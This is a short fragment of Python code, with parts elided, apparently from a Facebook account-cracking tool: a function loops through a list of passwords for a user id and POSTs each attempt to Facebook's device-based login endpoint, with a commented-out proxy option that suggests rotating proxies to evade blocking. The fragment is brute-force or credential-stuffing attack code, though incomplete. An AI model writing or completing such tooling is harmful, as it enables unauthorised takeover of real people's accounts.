...
def ATOM(uid, pww, total_idz):
    ...
    try:
        for pw in pww:
            ...
            response = session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=data,headers=headers,allow_redirects=False) #proxies=proxs)
            #print(response)
